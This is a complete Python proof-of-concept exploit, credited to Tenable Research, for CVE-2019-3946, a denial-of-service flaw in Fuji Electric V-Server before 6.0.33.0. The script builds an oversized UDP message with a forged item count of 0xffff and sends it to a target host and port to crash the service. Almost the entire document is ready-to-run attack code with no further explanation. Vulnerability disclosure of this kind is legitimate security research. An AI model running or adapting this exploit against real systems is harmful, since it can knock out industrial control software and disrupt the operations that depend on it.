##
# Exploit Title: Fuji Electric V-Server DoS
# Date: 06/11/2019
# Exploit Author: Tenable Research
# CVE : CVE-2019-3946
# Advisory: https://www.tenable.com/security/research/tra-2019-27
# Affected Vendors/Device/Firmware:
#  - Fuji Electric V-Server before 6.0.33.0
##

import sys, socket, ssl, argparse, binascii
from struct import *

def mk_msg(cmd, data,seq=1):
  mlen = 5 + len(data)
  msg = pack('<HHB', mlen, seq, cmd) + data;
  return msg;
 
parser = argparse.ArgumentParser()
parser.add_argument("target_host", help="V-Server host") 
parser.add_argument("target_port", help="V-Server port (ie. 8005)", type=int) 
args = parser.parse_args()
  
host = args.target_host
port = args.target_port

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
s.connect((host, port))

data = 'VSVR'                  # magic 
data += pack('<H', 0x3e7)      # sub-command
data += 'A' * 0x20             # DB data source name 
data += 'B' * 0x20             # DB user name 
data += 'C' * 0x20             # DB user creds 
data += 'D' * 0x80             # table name             

items_hdr = 'U' * 0xc
items_hdr +=  pack('<H', 0xffff)    # item count
items_hdr += 'U' * 0xc
data += items_hdr

# items
while len(data) + 6 <= 0x1388 - 5:
  data += pack('<HHH',0x8001, 0xc, 0x8001)

msg = mk_msg(51, data);

s.send(msg)
res = s.recv(1024)
print binascii.hexlify(res)
